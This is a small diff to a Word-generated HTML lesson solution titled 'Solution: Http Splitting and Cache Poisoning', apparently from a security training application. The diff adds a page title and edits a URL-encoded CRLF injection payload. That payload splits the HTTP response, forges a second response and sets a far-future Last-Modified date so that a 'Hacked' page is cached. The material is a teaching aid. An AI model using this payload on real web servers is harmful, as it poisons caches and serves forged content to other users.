@@ -9,6 +9,7 @@ xmlns="http://www.w3.org/TR/REC-html40">
 <meta name=ProgId content=Word.Document>
 <meta name=Generator content="Microsoft Word 12">
 <meta name=Originator content="Microsoft Word 12">
+<title>Solution: Http Splitting and Cache Poisoning </title>
 <link rel=File-List href="lesson_solutions/HttpSplitting_files/filelist.xml">
 <link rel=Edit-Time-Data href="lesson_solutions/HttpSplitting_files/editdata.mso">
 <!--[if !mso]>
@@ -979,7 +980,7 @@ attack.<o:p></o:p></span></p>
 poisoning requires manipulating the Last-Modified header. This must be changed
 to a date in the future.<o:p></o:p></span></p>
 
-<p class=MsoNormal><span style='font-family:"Arial","sans-serif"'>Inject: foobar%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aLast-Modified:%20Mon,%2027%20Oct%202003%2014:50:18%20GMT%0d%0aContent-Length:%2047%0d%0a%0d%0a&lt;html&gt;Hacked
+<p class=MsoNormal><span style='font-family:"Arial","sans-serif"'>Inject: foobar%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aLast-Modified:%20Mon,%2027%20Oct%202060%2014:50:18%20GMT%0d%0aContent-Length:%2047%0d%0a%0d%0a&lt;html&gt;Hacked
 </span><span style='font-family:Wingdings;mso-ascii-font-family:Arial;
 mso-hansi-font-family:Arial;mso-bidi-font-family:Arial;mso-char-type:symbol;
 mso-symbol-font-family:Wingdings'><span style='mso-char-type:symbol;mso-symbol-font-family:
